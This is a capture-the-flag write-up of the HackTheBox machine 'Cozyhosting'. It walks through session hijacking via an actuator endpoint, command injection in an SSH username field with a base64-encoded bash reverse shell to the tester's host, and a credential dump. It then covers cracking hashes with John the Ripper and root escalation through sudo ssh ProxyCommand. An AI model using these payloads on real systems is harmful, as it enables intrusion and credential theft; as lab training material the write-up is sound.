---
title: Cozyhosting
date: 2023-10-10
description: Cozyhosting | easy | HTB
categories:
- htb-easy
tags:
  - Command Injection
  - Postgresql
  - JTR
---

Cozyhosting is an easy machine from hackthebox which involved injection a session cookie redirecting to admin page. PLaying with the username field, got an error disclosing ssh command usage in the backend. After trying various bypassing methods sent the command without spaces and got back a shell as app user. Found credentials of postgres user in a jar file and dumped the hashes from the database. Cracked them using jtr and got access to josh user. Further enumerating, ssh can be run by josh user with root permissions.

<!--more-->

## NMAP TCP SCAN

```bash
# nmap -sC -sV -p- -vv --reason --min-rate=1000 -T4 10.10.11.230 -oN nmap_tcp_scan

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80

- Surfing the website we got a cookie named JSESSIONID

```bash
# gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirb/common.txt

/admin                (Status: 401) [Size: 97]
/error                (Status: 500) [Size: 73]
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/logout               (Status: 204) [Size: 0]

# gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/wfuzz/general/megabeast.txt -t 30

/actuator             (Status: 200) [Size: 634]
```

- Going to the ``actuator`` page

- Going to **/sessions** directory got two session cookie

```bash
{ "2F3333AC963252641A3BD937836A555A":"kanderson",
"2399F09710F0FCD106D670E1B184FAF0":"UNAUTHORIZED" }
```

- Intercepting the **/login** endpoint request in burpsuite and sending the above cookie value in place of `JSESSIONID` and we get redirected to a **/admin** page

- Below on that page we have connection settings (*hostname and username*)

- Intercepting the request in burpsuite and submitting *username* field as empty we get an error:

    `usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file`

- It means on the backend it is attempting a SSH connection.

- After trying some command injections, concluded that we cannot use spaces in the username field

- Google searched and got : https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces

- Again tried with sending username (*URL encoded*) as `;whoami${IFS%??};` but didn’t got any output

- So tried `;ping${IFS%??}-c${IFS%??}2${IFS%??}10.10.14.81${IFS%??};` (*URL encoded*) and on my machine `sudo tcpdump -i tun0 icmp` and got connection back

- So we can try to run a reverse shell (*URL encoded*): `echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44MS84ODg4IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash` and got a shell back

## Enum as app user

- Spawned fully interactive TTY Shell

- Found a file `cloudhosting-0.0.1.jar` in the **/app** directory and transferred it into my machine

- Searched for passwords after unjar the file: `unjar xvf cloudhosting-0.0.1.jar` , `grep -iR 'password' .` and got a file with credentials: `BOOT-INF/classes/application.properties`

- Got credentials of **postgres** user: **Vg&nvzAQ7XxR**

- Using these credentials connected to postgress database: `psql -h 127.0.0.1 -U postgres`

- Connected to **cozyhosting** database and got creds

```bash
cozyhosting=# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
cozyhosting=# \d
              List of relations
 Schema |     Name     |   Type   |  Owner
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)

cozyhosting=# select * from users;
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

- Copied the hashes into a file and cracked them using *JTR:* `john hashes --wordlist=/usr/share/wordlists/rockyou.txt`

- We got a password **manchesterunited**

- Tried this password on *josh* and we get successfully logged in.


## Enum as josh user

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
  (root) /usr/bin/ssh *
```

- Went to gtfobins and got the shell as root

```bash
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
root@cozyhosting:/home/josh# whoami
root
```